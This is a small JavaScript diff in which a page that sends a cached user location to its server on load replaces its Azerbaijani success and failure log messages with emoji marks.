@@ -147,9 +147,9 @@ window.addEventListener('DOMContentLoaded', async () => {
       const ok = await postToServer({ videoUrl: null, location: cachedLocation });
       if (ok) {
         sentOnLoad = true;
-        appendLogUI('Lokasiya uğurla göndərildi (on-load)', 'ok');
+        appendLogUI('✅ (on-load)', 'ok');
       } else {
-        appendLogUI('Lokasiya göndərilə bilmədi (on-load)', 'warn');
+        appendLogUI('❌ (on-load)', 'warn');
       }
     } else {
       appendLogUI('Lokasiya mövcud deyil və ya icazə verilməyib', 'warn');
